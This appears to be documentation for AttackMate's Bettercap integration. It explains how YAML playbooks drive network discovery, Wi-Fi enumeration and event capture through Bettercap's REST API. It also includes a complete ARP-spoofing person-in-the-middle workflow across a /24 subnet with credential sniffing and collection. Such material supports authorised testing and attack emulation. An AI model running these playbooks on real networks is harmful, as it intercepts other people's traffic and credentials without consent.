# Bettercap Integration

[Bettercap](https://www.bettercap.org/) is a network attack and monitoring tool. It handles ARP spoofing, person-in-the-middle attacks, network discovery, BLE and Wi-Fi enumeration, and packet sniffing, all through a REST API.

AttackMate's `bettercap` lets you integrate network-layer attacks directly into a playbook.

## Prerequisites

Bettercap must be running with its REST API enabled before any `bettercap` command will work:

```bash
# Start Bettercap with the REST API (bettercap v2 requires the "set" prefix for parameters)
sudo bettercap -eval "set api.rest.username btrcp; set api.rest.password secret; api.rest on"
```

## Configuration

Connection profiles are defined in the AttackMate config file (not the playbook):

```yaml
# attackmate.yml
bettercap_config:
  default:
    url: "http://localhost:8081"
    username: btrcp
    password: secret
  remote-sensor:
    url: "http://192.168.1.200:8081"
    username: sensor
    password: topsecret
```

When a `bettercap` command omits `connection`, the first profile (`default`) is used automatically.

## The `bettercap` Command

```yaml
- type: bettercap
  cmd: <api_action>
  connection: default  # optional
```

All responses are returned as JSON strings in `$RESULT_STDOUT`, which you can then parse with `type: regex` or `type: json`.

## Available Commands

### `post_api_session` - Send a Bettercap command

Sends an interactive command to the Bettercap session (equivalent to typing in the Bettercap REPL):

```yaml
- type: bettercap
  cmd: post_api_session
  data:
    cmd: "net.probe on"

- type: bettercap
  cmd: post_api_session
  data:
    cmd: "arp.spoof.targets 192.168.1.0/24"

- type: bettercap
  cmd: post_api_session
  data:
    cmd: "arp.spoof on"
```

### `get_session_lan` - Discover LAN hosts

Returns a JSON list of hosts discovered on the local network:

```yaml
- type: bettercap
  cmd: get_session_lan

- type: debug
  cmd: "LAN devices: $RESULT_STDOUT"
```

Filter to a specific MAC:

```yaml
- type: bettercap
  cmd: get_session_lan
  mac: "aa:bb:cc:dd:ee:ff"
```

### `get_session_wifi` - Wi-Fi enumeration

Returns discovered Wi-Fi access points and clients:

```yaml
- type: bettercap
  cmd: get_session_wifi
```

### `get_events` - Read captured events

Returns everything Bettercap has captured (credentials, requests, etc.) since the session started:

```yaml
- type: bettercap
  cmd: get_events
```

### `delete_api_events` - Clear the event buffer

```yaml
- type: bettercap
  cmd: delete_api_events
```

### `get_file` - Retrieve a file from the Bettercap host

```yaml
- type: bettercap
  cmd: get_file
  filename: "/tmp/bettercap.pcap"
```

### Other query commands

| Command | What it returns |
|---|---|
| `get_session_modules` | Active Bettercap modules |
| `get_session_env` | Session environment variables |
| `get_session_gateway` | Default gateway info |
| `get_session_interface` | Network interface info |
| `get_session_packets` | Packet counters |
| `get_session_started_at` | Session start timestamp |
| `get_session_ble` | Discovered BLE devices |
| `get_session_hid` | Discovered HID devices |

## Typical Network Sniffing Workflow

```yaml
commands:
  # 1. Enable passive network probing (sends ARP queries to discover hosts)
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "net.probe on"

  # 2. Wait for discovery to collect data
  - type: sleep
    cmd: "10"

  # 3. Stop probing
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "net.probe off"

  # 4. Retrieve discovered hosts
  - type: bettercap
    cmd: get_session_lan

  - type: debug
    cmd: "Discovered hosts: $RESULT_STDOUT"
```

## Person in the Middle with ARP Spoofing

```yaml
commands:
  # Configure the target subnet
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "arp.spoof.targets 192.168.1.0/24"

  # Enable credential sniffing
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "net.sniff on"

  # Activate ARP spoofing (MITM)
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "arp.spoof on"

  # Let it run for 60 seconds
  - type: sleep
    cmd: "60"

  # Collect any captured credentials/events
  - type: bettercap
    cmd: get_events

  # Stop MITM
  - type: bettercap
    cmd: post_api_session
    data:
      cmd: "arp.spoof off"
```

## Key Fields Reference

| Field | Type | Required | Description |
|---|---|---|---|
| `cmd` | str | Yes | API action to perform |
| `connection` | str | No | Named connection from `bettercap_config` (default: first entry) |
| `data` | dict | When `cmd: post_api_session` | Key-value POST data (usually `{cmd: "..."}`) |
| `filename` | str | When `cmd: get_file` | Full path of file to retrieve |
| `mac` | str | No | Filter by MAC address (for `get_session_lan`, `get_session_wifi`, `get_session_ble`, `get_session_hid`) |
